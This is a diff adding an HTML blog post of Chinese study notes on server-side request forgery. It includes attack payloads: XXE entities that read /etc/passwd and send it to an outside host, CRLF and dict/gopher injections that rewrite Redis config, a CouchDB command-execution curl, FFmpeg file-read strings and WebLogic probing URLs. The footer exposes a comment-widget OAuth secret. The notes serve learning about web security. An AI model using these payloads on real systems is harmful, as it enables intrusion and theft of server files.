@@ -1,0 +1,474 @@
+
+<!DOCTYPE html>
+<html lang="Zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SSRF - 汐白的学习档案</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xibai,"> 
+    <meta name="description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,介绍什么是SSRFSSRF(Server-Side Request Forgery:服务器端请求伪造),由攻击者构造的攻击链接传给服务端执行造成的漏洞.SSRF通过利用一个可以发送网络请求的服务，以,"> 
+    <meta name="author" content="Xibai"> 
+    <link rel="alternative" href="atom.xml" title="汐白的学习档案" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="SSRF - 汐白的学习档案"/>
+    <meta name="twitter:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,介绍什么是SSRFSSRF(Server-Side Request Forgery:服务器端请求伪造),由攻击者构造的攻击链接传给服务端执行造成的漏洞.SSRF通过利用一个可以发送网络请求的服务，以,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="汐白的学习档案"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="SSRF - 汐白的学习档案"/>
+    <meta property="og:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,介绍什么是SSRFSSRF(Server-Side Request Forgery:服务器端请求伪造),由攻击者构造的攻击链接传给服务端执行造成的漏洞.SSRF通过利用一个可以发送网络请求的服务，以,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">汐白的学习档案</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://xibai.xyz"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">SSRF</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">SSRF</h1>
+        <div class="stuff">
+            <span>九月 18, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h3><p><code>SSRF</code>(Server-Side Request Forgery:服务器端请求伪造),由攻击者构造的攻击链接传给服务端执行造成的漏洞.<br><code>SSRF</code>通过利用一个<strong>可以发送网络请求的服务</strong>，<strong>以它为跳板对其他资源进行访问或者说攻击</strong>。</p>
+<p>通俗点讲，<code>SSRF</code>的攻击方式其实就类似于抓了一个肉鸡，然后有这个肉鸡去执行攻击者后续想要执行的操作。这样一来，在受到攻击或者说接收到网络请求的服务器的视角看，对它进行攻击的是这台肉鸡服务器而非攻击者。<br>（即：身份伪造）<br>这个时候如果这台所谓的 “肉鸡” 服务器对于攻击者所攻击的目标又拥有特殊身份权限的话，便是所谓的<code>SSRF</code>攻击了。</p>
+<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20210918151006.png" alt="20210918151006"></p>
+<p>常见的<code>SSRF</code>攻击多为通过跳板机访问目标资源。形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
+<h3 id="SSRF可以做什么"><a href="#SSRF可以做什么" class="headerlink" title="SSRF可以做什么"></a>SSRF可以做什么</h3><ul>
+<li>扫描内部网络的 <code>服务</code> or <code>资源</code></li>
+<li>利用<code>file</code>协议读取本地文件等</li>
+<li>暴力穷举（如：<code>users</code>|<code>dirs</code>|<code>files</code>）</li>
+<li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li>
+<li>向内部<strong>任意主机</strong>的<strong>任意端口</strong>发送攻击者精心构造的数据包。</li>
+</ul>
+<p>常用协议：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>协议名称</th>
+<th>简介</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Gopher</td>
+<td>攻击内部应用的主力军</td>
+</tr>
+<tr>
+<td>Dict</td>
+<td>端口探测，版本信息收集</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>探测是否存在ftp</td>
+</tr>
+<tr>
+<td>http</td>
+<td>探测是否存在ssrf</td>
+</tr>
+<tr>
+<td>file</td>
+<td>读取本地文件</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>注意：jdk1.7后java不再支持gopher</p>
+<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages2059787-20201019111517054-1252234555.png" alt="2059787-20201019111517054-1252234555"></p>
+<h3 id="怎么找SSRF"><a href="#怎么找SSRF" class="headerlink" title="怎么找SSRF"></a>怎么找SSRF</h3><ul>
+<li>能够对外发起网络请求的地方</li>
+<li>从远程服务器请求资源（Upload from URL 、Import &amp; Export RSS feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
+<li>Webmail 收取其他邮箱邮件（POP3 | IMAP | SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffpmg、ImageMaic、DOCX、PDF、XML处理器）</li>
+</ul>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>有两种情况会阻碍<code>SSRF</code>的利用：</p>
+<ul>
+<li>服务端开启OpenSSL无法进行交互利用</li>
+<li>服务端需要鉴权信息（Cookies &amp; Username：Password）</li>
+</ul>
+<h4 id="从远程服务器请求资源"><a href="#从远程服务器请求资源" class="headerlink" title="从远程服务器请求资源"></a>从远程服务器请求资源</h4><ul>
+<li>Upload from URL<ul>
+<li>Discuz!</li>
+</ul>
+</li>
+<li>Import &amp; Export RSS feed<ul>
+<li>Web Blog</li>
+</ul>
+</li>
+<li>使用XML引擎对象的地方<ul>
+<li>Wordpress xmlrpc.php</li>
+<li>XXE实体引用</li>
+<li>DTD文档类型定义</li>
+<li>XLST — XML文档转换为其他格式</li>
+</ul>
+</li>
+</ul>
+<h5 id="XML-Fuzz-Cheatsheet（模糊测试表）"><a href="#XML-Fuzz-Cheatsheet（模糊测试表）" class="headerlink" title="XML Fuzz Cheatsheet（模糊测试表）"></a>XML Fuzz Cheatsheet（模糊测试表）</h5><ul>
+<li>DTD Remote Access —— 文档结构标准<br>＜!ENTITY % d SYSTEM “<a target="_blank" rel="noopener" href="http://wuyun.org/evil.dtd&quot;＞">http://wuyun.org/evil.dtd&quot;＞</a></li>
+<li>XML External Entity —— 外部实体引用<br>＜!ENTITY % file system “file:///etc/passwd”＞<br>＜!ENTITY % d SYSTEM “<a target="_blank" rel="noopener" href="http://wuyun.org/file?data=%file&quot;＞">http://wuyun.org/file?data=%file&quot;＞</a></li>
+<li>URL Invocation —— URL调用<br>＜!DOCTYPE roottag PUBLIC “-//VSR//PENTEST//EN” “<a target="_blank" rel="noopener" href="http://wuyun.org/urlin&quot;＞">http://wuyun.org/urlin&quot;＞</a><br>＜roottag＞test＜/roottag＞</li>
+<li>XML Encryption —— XML 加密<br>＜xenc:AgreementMethod Algorithm= “<a target="_blank" rel="noopener" href="http://wuyun.org/1&quot;＞">http://wuyun.org/1&quot;＞</a><br>＜xenc:EncryptionProperty Target= “<a target="_blank" rel="noopener" href="http://wuyun.org/2&quot;＞">http://wuyun.org/2&quot;＞</a><br>＜xenc:CipherReference URI= “<a target="_blank" rel="noopener" href="http://wuyun.org/3&quot;＞">http://wuyun.org/3&quot;＞</a><br>＜xenc:DataReference URI= “<a target="_blank" rel="noopener" href="http://wuyun.org/4&quot;＞">http://wuyun.org/4&quot;＞</a></li>
+</ul>
+<h5 id="XML-Fuzz-Cheatsheet-——-Web-Services-标准项"><a href="#XML-Fuzz-Cheatsheet-——-Web-Services-标准项" class="headerlink" title="XML Fuzz Cheatsheet —— Web Services 标准项"></a>XML Fuzz Cheatsheet —— Web Services 标准项</h5><ul>
+<li>XML Signature — XMLqianming<br>＜Reference URI=”<a target="_blank" rel="noopener" href="http://wuyun.org/5&quot;＞">http://wuyun.org/5&quot;＞</a></li>
+<li>WS Policy — SOA WS策略项<br>＜To xmlns=”<a target="_blank" rel="noopener" href="http://www.w3.org/2005/08/addressing&quot;＞http://wuyun.org/to＜/To＞">http://www.w3.org/2005/08/addressing&quot;＞http://wuyun.org/to＜/To＞</a><br>＜ReplyTo xmlns=”<a target="_blank" rel="noopener" href="http://www.w3.org/2005/08/addressing&quot;＞">http://www.w3.org/2005/08/addressing&quot;＞</a><br>＜Address＞<a target="_blank" rel="noopener" href="http://wuyun.org/rto＜/Address＞">http://wuyun.org/rto＜/Address＞</a><br>＜/ReplyTo＞</li>
+<li>From WS Security — JAVA WEB安全策略<br>＜wsp:PolicyReference URI=”<a target="_blank" rel="noopener" href="http://wuyun.org/pr&quot;＞">http://wuyun.org/pr&quot;＞</a></li>
+<li>WS Addressing — Web Services消息寻址<br>＜input message=”wooyun” wsa:Action=”<a target="_blank" rel="noopener" href="http://wuyun.org/ip">http://wuyun.org/ip</a>“ /＞<br>＜output message=”wooyun” wsa:Action=”<a target="_blank" rel="noopener" href="http://wuyun.org/op">http://wuyun.org/op</a>“ /＞</li>
+</ul>
+<h5 id="XML-Fuzz-Cheatsheet-——-第三方应用与新协议"><a href="#XML-Fuzz-Cheatsheet-——-第三方应用与新协议" class="headerlink" title="XML Fuzz Cheatsheet —— 第三方应用与新协议"></a>XML Fuzz Cheatsheet —— 第三方应用与新协议</h5><ul>
+<li>WS Federation —— Web Services通用标准<br>＜fed:Federation FederationID=”<a target="_blank" rel="noopener" href="http://wuyun.org/fid&quot;＞">http://wuyun.org/fid&quot;＞</a><br>＜fed:FederationInclude＞<a target="_blank" rel="noopener" href="http://wuyun.org/inc＜/fed:FederationInclude＞">http://wuyun.org/inc＜/fed:FederationInclude＞</a><br>＜fed:TokenIssuerName＞<a target="_blank" rel="noopener" href="http://wuyun.org/iss＜/fed:TokenIssuerName＞">http://wuyun.org/iss＜/fed:TokenIssuerName＞</a><br>＜mex:MetadataReference＞<br>  ＜wsa:Address＞<a target="_blank" rel="noopener" href="http://wuyun.org/mex＜/wsa:Address＞">http://wuyun.org/mex＜/wsa:Address＞</a><br>＜/mex:MetadataReference＞</li>
+<li>ODATA (edmx)新协议<br>＜edmx:Reference URI=”<a target="_blank" rel="noopener" href="http://wuyun.org/edmxr&quot;＞">http://wuyun.org/edmxr&quot;＞</a><br>＜edmx:AnnotationsReference URI=”<a target="_blank" rel="noopener" href="http://wuyun.org/edmxa&quot;＞">http://wuyun.org/edmxa&quot;＞</a></li>
+<li>XBRL —— 财务报告标准<br>＜xbrli:identifier scheme=”<a target="_blank" rel="noopener" href="http://wuyun.org/xbr&quot;＞">http://wuyun.org/xbr&quot;＞</a><br>＜link:roleType roleURI=”<a target="_blank" rel="noopener" href="http://wuyun.org/role&quot;＞">http://wuyun.org/role&quot;＞</a></li>
+<li>STRATML —— 策略标记语言<br>＜stratml:Source＞<a target="_blank" rel="noopener" href="http://wuyun.org/stml＜/stratml:Source＞">http://wuyun.org/stml＜/stratml:Source＞</a></li>
+</ul>
+<h5 id="数据库内置功能"><a href="#数据库内置功能" class="headerlink" title="数据库内置功能"></a>数据库内置功能</h5><ul>
+<li><p>MongoDB<br>  变废为宝的未授权访问</p>
+<blockquote>
+<p>db.copyDatabase(‘\r\nconfig set dbfilename wyssrf\r\nquit\r\n’,’test’,’10.6.4.166:6379’)</p>
+</blockquote>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@10-6-4-166 ~]<span class="comment"># nc -l -vv 6379</span></span><br><span class="line">Connection from 10.6.19.144 port 6379 [tcp/*]</span><br><span class="line">config <span class="built_in">set</span> dbfilename wyssrf</span><br><span class="line">quit</span><br><span class="line">.system.namespaces</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>db.copyDatabase(‘helo’,’test’,’10.6.4.166:22’);<br>  {“errmsg” : “……helo.systemnamespaces failed: “ }<br>db.copyDatabase(‘helo’,’test’,’10.6.4.166:9999’);<br>  {“errormsg” : “couldn’t connect to server 10.6.4.166:9999”}<br>  互联网开放了50000+不需要授权访问的 MongoDB Server</p>
+</blockquote>
+</li>
+<li>Oracle<br>  UTL_HTTP<br>  UTL_TCP<br>  UTL_SMTP<br>  <a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E11882_01/appdev.112/e40758/u_http.htm#ARPLS070">https://docs.oracle.com/cd/E11882_01/appdev.112/e40758/u_http.htm#ARPLS070</a></li>
+<li><p>PostgresSQL<br>  dblink_send_query()发起远程查询</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> dblink_send_query(</span><br><span class="line">    <span class="string">&#x27;host=127.0.0.1 dbname=quit user=\&#x27;</span>\r\nconfig <span class="keyword">set</span> dbfilename wyssrf\r\nquit\r\n\<span class="string">&#x27; password=1 port=6379 sslmode=disable&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;select version();&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>  回显：</p>
+<blockquote>
+<p>[root@localhost ~]# nc -l -vv 6379<br>  Connection from 127.0.0.1 port 6379 [tcp/*]<br>  config set dbfilename wyssrf<br>  quit</p>
+</blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/8.4/static/dblink.html">https://www.postgresql.org/docs/8.4/static/dblink.html</a></p>
+</li>
+<li><p>MSSQL<br>  OpenRowset()</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> openrowset(<span class="string">&#x27;SQLOLEDB&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server=192.168.1.5;uid=sa;pwd=sa;database=master&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>  OpenDatasource()</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OpenDatasource(<span class="string">&#x27;SQLOLEDB&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Data Source=ServerName;User ID=sa;Password=sa&#x27;</span> ) .Northwind.dbo.Categories</span><br></pre></td></tr></table></figure>
+<p>  <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/zh-cn/library/ms190312.aspx">https://msdn.microsoft.com/zh-cn/library/ms190312.aspx</a><br>  协议限制： 穷举用户口令 XP_CMDSHELL</p>
+</li>
+<li><p>CouchDB<br>  HTTP API /_replicate</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST http:<span class="operator">/</span><span class="operator">/</span>couchdb<span class="operator">-</span>server:<span class="number">5984</span><span class="operator">/</span>_replicate </span><br><span class="line">Content<span class="operator">-</span>Type: application<span class="operator">/</span>json </span><br><span class="line">Accept: application<span class="operator">/</span>json </span><br><span class="line">&#123; </span><br><span class="line">    &quot;source&quot; : &quot;recipes&quot;, </span><br><span class="line">    &quot;target&quot; : &quot;dict://redis.wuyun.org:6379/flushall”, </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  <a target="_blank" rel="noopener" href="https://docs.couchdb.org/en/stable/api/server/common.html">https://docs.couchdb.org/en/stable/api/server/common.html</a></p>
+</li>
+</ul>
+<h5 id="Web-mail-收取其他邮箱邮件"><a href="#Web-mail-收取其他邮箱邮件" class="headerlink" title="Web mail 收取其他邮箱邮件"></a>Web mail 收取其他邮箱邮件</h5><ul>
+<li>QQ邮箱</li>
+<li>163/126邮箱</li>
+<li>新浪邮箱</li>
+</ul>
+<h5 id="文件处理、编码处理、属性信息处理"><a href="#文件处理、编码处理、属性信息处理" class="headerlink" title="文件处理、编码处理、属性信息处理"></a>文件处理、编码处理、属性信息处理</h5><p>网盘 &amp; 邮箱系统<br>PDF、DOCX 在线编辑<br>文件自动预览</p>
+<ul>
+<li>FFmpeg<br>  concat:<a target="_blank" rel="noopener" href="http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd">http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd</a></li>
+<li>ImageMagick (mvg语法 URL函数向服务器发起HTTP请求)<br>  fill ‘url(<a target="_blank" rel="noopener" href="http://wyssrf.wuyun.org">http://wyssrf.wuyun.org</a>)’</li>
+<li>XML parsers ( XSLT ) XSLT包含了超过100个内置函数<br>  document(): 用来访问另一个xml文档内的信息<br>  include(): 用来将两个样式表合并<br>  import(): 用来将一个样式表覆盖另一个</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>需成功发送针对目标服务漏洞的<code>payload</code></li>
+</ul>
+<h3 id="遇到限制的绕过方式"><a href="#遇到限制的绕过方式" class="headerlink" title="遇到限制的绕过方式"></a>遇到限制的绕过方式</h3><h4 id="IP限制绕过（xip-io、十进制IP、八进制IP）"><a href="#IP限制绕过（xip-io、十进制IP、八进制IP）" class="headerlink" title="IP限制绕过（xip.io、十进制IP、八进制IP）"></a>IP限制绕过（xip.io、十进制IP、八进制IP）</h4><ul>
+<li>要求对象必须包含域名Domain，且符合<code>.tld</code>标准<br>  url=<a target="_blank" rel="noopener" href="http://www.10.10.10.10.xip.io">http://www.10.10.10.10.xip.io</a></li>
+<li>将10、127、172、192开头的私有IP列入黑名单<br>  十进制IP： *256**3 + *256**2 + *256<br>  八进制IP：012.10.10.10 = 10.10.10.10</li>
+</ul>
+<h4 id="协议限制绕过（Redirect̵CRLF-header-injection）"><a href="#协议限制绕过（Redirect̵CRLF-header-injection）" class="headerlink" title="协议限制绕过（Redirect̵CRLF header injection）"></a>协议限制绕过（Redirect̵CRLF header injection）</h4><ul>
+<li><p>只允许<code>startswith(&#39;http&#39;)</code>传入</p>
+<ul>
+<li><p>302 Redirect 跳转 (HTTP Scheme ——&gt; DICT Scheme)<br>Discuz! SSRF</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://wuyun.org/302.php?helo.jpg[/img]</span><br></pre></td></tr></table></figure>
+<p>302.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: dict://wuyun.org:6379/set:1:helo”); # set 1 helo \n</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CRLF ( Ascii Code ) — header injection</p>
+<ul>
+<li><p>WebLogic uddiexplorer SSRF</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://wuyun.org/helo&amp;rdoSearch=name&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CRLF -&gt;ASCII Code<br>  %0d -&gt; 0x0d -&gt; \r<br>  %0a -&gt; 0x0a -&gt; \n</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="WebLogic-SSRF-漏洞利用-CRLF-HTTP头注入"><a href="#WebLogic-SSRF-漏洞利用-CRLF-HTTP头注入" class="headerlink" title="WebLogic SSRF 漏洞利用 CRLF HTTP头注入"></a>WebLogic SSRF 漏洞利用 CRLF HTTP头注入</h5><p>example：<br>    <img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages111.png" alt="111"><br>    <img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages112.png" alt="112"><br>CRLF的攻击方式其实在某种角度上和http走私攻击的原理有重合部分</p>
+<h5 id="WebLogic-SSRF-服务探测-FingerPrint"><a href="#WebLogic-SSRF-服务探测-FingerPrint" class="headerlink" title="WebLogic SSRF 服务探测 (FingerPrint)"></a>WebLogic SSRF 服务探测 (FingerPrint)</h5><ul>
+<li><p>请求未开放的服务<br>  weblogic.uddi.client.structures.exception.XML_SoapException: Tried<br>all: ‘1’ addresses, but could not connect over HTTP to server:<br>‘fuzz.wuyun.com’, port: ‘88’</p>
+</li>
+<li><p>请求开放的服务<br>  weblogic.uddi.client.structures.exception.XML_SoapException:<br>Received a response from url: <a target="_blank" rel="noopener" href="http://fuzz.wuyun.com:22/helo">http://fuzz.wuyun.com:22/helo</a> which<br>did not have a valid SOAP content-type: null.</p>
+</li>
+<li><p>可被识别的回显<br>  weblogic.uddi.client.structures.exception.XML_SoapException:<br>Received a response from url: <a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com/</a> which did not<br>have a valid SOAP content-type: text/html; charset=UTF-8</p>
+</li>
+<li><p>不可被识别的回显<br>  weblogic.uddi.client.structures.exception.XML_SoapException:<br>Received a response from url: <a target="_blank" rel="noopener" href="http://fuzz.wuyun.com:22">http://fuzz.wuyun.com:22</a> which did<br>not have a valid SOAP content-type: null.</p>
+</li>
+</ul>
+<h5 id="大部分企业认为WebLogic自带的SSRF不算是漏洞"><a href="#大部分企业认为WebLogic自带的SSRF不算是漏洞" class="headerlink" title="大部分企业认为WebLogic自带的SSRF不算是漏洞"></a>大部分企业认为WebLogic自带的SSRF不算是漏洞</h5><p>BEA &amp; Oracle WebLogic 在行业中的使用占比：</p>
+<ul>
+<li>银行、金融、证券行业：80%</li>
+<li>电力、能源行业：70%</li>
+<li>国家基础设施 &amp; 政府：90%</li>
+</ul>
+<h4 id="调用系统支持的协议和方法（Protocols-amp-Wrappers）"><a href="#调用系统支持的协议和方法（Protocols-amp-Wrappers）" class="headerlink" title="调用系统支持的协议和方法（Protocols &amp; Wrappers）"></a>调用系统支持的协议和方法（Protocols &amp; Wrappers）</h4><ul>
+<li><p>PHP<br><a target="_blank" rel="noopener" href="http://php.net/manual/en/wrappers.php">http://php.net/manual/en/wrappers.php</a></p>
+</li>
+<li><p>Java<br>sun.net.www.protocol.*<br>file ftp gopher http https jar mailto netdoc</p>
+<blockquote>
+<p>file:// — Accessing local filesystem<br>http:// — Accessing HTTP(s) URLs<br>ftp:// — Accessing FTP(s) URLs<br>php:// — Accessing various I/O streams<br>zlib:// — Compression Streams<br>data:// — Data (RFC 2397)<br>glob:// — Find pathnames matching pattern<br>phar:// — PHP Archive<br>ssh2:// — Secure Shell 2 rar:// — RAR<br>expect:// — Process Interaction Streams</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="漏洞利用（远程服务）"><a href="#漏洞利用（远程服务）" class="headerlink" title="漏洞利用（远程服务）"></a>漏洞利用（远程服务）</h3><ul>
+<li>HTTP协议<br>  GET /path HTTP/1.1<br>POST /path HTTP/1.1<br>WebDav:<br>PUT MOVE DEL</li>
+<li>UDP协议<br> tftp://10.10.10.10/get helo</li>
+<li>SMBreplay &amp; BadTunnel<br> UNC Call:<br>\10.10.10.10\c$\boot.ini</li>
+<li>FTP &amp; SMTP &amp; POP3<br>  <img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20211105112015.png" alt="20211105112015"></li>
+</ul>
+<h4 id="利用SSRF攻击本地服务"><a href="#利用SSRF攻击本地服务" class="headerlink" title="利用SSRF攻击本地服务"></a>利用SSRF攻击本地服务</h4><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20211105112120.png" alt="20211105112120"></p>
+<h4 id="利用SSRF攻击数据库-amp-缓存"><a href="#利用SSRF攻击数据库-amp-缓存" class="headerlink" title="利用SSRF攻击数据库&amp;缓存"></a>利用SSRF攻击数据库&amp;缓存</h4><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20211105112240.png" alt="20211105112240"></p>
+<ul>
+<li><p>Memcached</p>
+<ul>
+<li>vBulletin 远程命令执行（修改memcached模板缓存）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33940102/article/details/87980914">https://blog.csdn.net/weixin_33940102/article/details/87980914</a></li>
+</ul>
+</li>
+<li><p>利用SSRF攻击CouchDB</p>
+<ul>
+<li>能够发起SSRF请求，HTTP /_replicate API</li>
+<li>可以被SSRF攻击，Restful的API接口</li>
+<li>curl -X PUT ‘<a target="_blank" rel="noopener" href="http://1.1.1.1:5984/_config/query_servers/cmd">http://1.1.1.1:5984/_config/query_servers/cmd</a>‘ -d ‘“/sbin/ifconfig &gt;/tmp/6666”‘</li>
+</ul>
+</li>
+</ul>
+<h4 id="XXE-gt-SSRF-gt-CSRF-组合方法"><a href="#XXE-gt-SSRF-gt-CSRF-组合方法" class="headerlink" title="XXE -&gt; SSRF -&gt; CSRF 组合方法"></a>XXE -&gt; SSRF -&gt; CSRF 组合方法</h4><ul>
+<li>CoreMail 提供一个绑定在内部IP的高权限API<blockquote>
+<p>/apiws/services/API?wsdl<br>可以创建&amp;删除用户、修改超级管理员密码</p>
+</blockquote>
+</li>
+<li>CoreMail 前台存在一个XML XXE SSRF漏洞</li>
+<li>利用SSRF漏洞请求外部无法访问的高权限API</li>
+</ul>
+<h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><ul>
+<li>基于python<br>furl / requests / multiprocessing / time / re</li>
+<li>服务指纹识别<br>时间差盲测<br>根据回显内容进行判断</li>
+<li>利用漏洞整理分类<br>协议（http <GET|POST> ̵dict̵gopher̵tftp）</li>
+</ul>
+<h4 id="服务指纹识别"><a href="#服务指纹识别" class="headerlink" title="服务指纹识别"></a>服务指纹识别</h4><ul>
+<li>时间差盲猜<blockquote>
+<p>keep-Alive: timeout=5<br>一直保持连接 keep-alive<br>http &amp; dict://wuyun.org:6379<br>传完数据，自动断开</p>
+</blockquote>
+</li>
+<li>根据回显内容<blockquote>
+<p>[root@localhost ~] # curl <a target="_blank" rel="noopener" href="http://wuyun.org:22">http://wuyun.org:22</a><br>SSH-2.0-OpenSSH_5.3<br>Protocol mismatch.</p>
+</blockquote>
+</li>
+</ul>
+<p>正确错误状态对比：</p>
+<blockquote>
+<p>db.copyDatabase(‘helo’,’test’,’10.6.4.166:22’);<br>{“errmsg” : “……helo.systemnamespaces failed: “ }<br>db.copyDatabase(‘helo’,’test’,’10.6.4.166:6379’);<br>{“errormsg” : “couldn’t connect to server 10.6.4.166:6379”}</p>
+</blockquote>
+<h4 id="能用于SSRF的漏洞列表"><a href="#能用于SSRF的漏洞列表" class="headerlink" title="能用于SSRF的漏洞列表"></a>能用于SSRF的漏洞列表</h4><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20211108113643.png" alt="20211108113643"></p>
+<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20211108113704.png" alt="20211108113704"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="5cd24ed310c0cbc2a2ed"
+        data-cs="51aa998e509794b7b061784f1f3d41018af118f6"
+        data-r="xikong-mubai.github.io"
+        data-o="xikong-mubai"
+        data-a="xikong-mubai"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
